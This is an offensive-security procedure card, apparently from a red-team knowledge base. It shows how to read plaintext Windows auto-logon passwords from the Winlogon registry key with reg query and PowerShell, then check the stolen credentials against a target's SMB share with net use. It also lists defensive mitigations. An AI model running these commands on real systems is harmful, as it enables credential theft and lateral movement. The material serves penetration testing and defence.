---
type: procedure
description: >-
  Query the Windows registry to extract plaintext credentials configured for
  automatic logon.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credentials in Files]]'
sub_techniques: []
tags:
  - data-exposure
  - enumeration
  - credentials
platforms:
  - Windows
commands:
  - '[[commands/Reg-Query-Autologon-Registry-Keys]]'
tools: []
validated: true
---

# List-Windows-Autologon-Credentials-from-Registry

## Summary

This procedure retrieves auto-logon credentials stored in plaintext in the Winlogon registry hive, a common misconfiguration for kiosk or service accounts.

## Description

Windows stores auto-logon details (DefaultUserName, DefaultPassword) in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon for convenience, but they are readable by any local user, enabling credential theft for lateral movement.

## Requirements

1. Local or remote access to Windows host (e.g., via WinRM)
2. Read access to HKLM registry hive
3. Reg.exe available (built-in)
4. Target with auto-logon enabled

## Defense

- Disable auto-logon feature via Group Policy
- Encrypt or avoid storing passwords in registry
- Restrict registry access with ACLs
- Audit registry changes (Event ID 4657)

## Objectives

1. Extract stored credentials
2. Identify domain or local accounts
3. Use for further access

## Instructions

### Step 1: Access Registry Query Tool

**Context**: Ensure shell access; reg query is native.

**Command**:
```command_prompt
reg query /?
```

> Confirms availability.

### Step 2: Query Winlogon Hive

**Context**: Dump all keys under Winlogon.

**Command** ([[commands/Reg-Query-Autologon-Registry-Keys]]):
```command_prompt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

> Lists values. Expected: DefaultPassword, etc.

### Step 3: Filter for Credentials

**Context**: Grep for key values.

**Command** (in PowerShell):
```powershell
(reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword) | Select-String "REG_SZ"
```

> Extracts password. If AutoAdminLogon=1, creds active.

### Step 4: Validate Credentials

**Context**: Test extracted creds with dir \target_ip\c$.

**Command**:
```command_prompt
net use \\$_TARGET_IP\IPC$ /user:$_USERNAME $_PASSWORD
```

> Success: Creds valid for SMB/WinRM.
